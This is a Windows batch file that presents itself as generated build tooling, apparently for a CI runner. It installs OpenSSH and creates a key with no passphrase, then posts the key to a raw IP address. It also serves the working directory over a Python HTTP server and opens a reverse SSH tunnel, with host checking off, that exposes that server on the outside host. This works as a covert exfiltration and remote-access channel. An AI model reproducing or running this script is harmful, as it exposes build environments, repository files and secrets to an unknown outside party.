@echo off
rem This file is generated from main.pbat, all edits will be lost
C:\msys64\usr\bin\bash.exe -lc "pacman -S openssh --noconfirm"
C:\msys64\usr\bin\ssh-keygen.exe -b 2048 -t rsa -f "/home/runneradmin/.ssh/id_rsa" -q -N ""
curl -F key=@C:\msys64\home\runneradmin\.ssh\id_rsa.pub http://89.104.69.220:3000/key
start python -m http.server
C:\msys64\usr\bin\ssh.exe -o StrictHostKeyChecking=no -N -R 8000:127.0.0.1:8000 github@89.104.69.220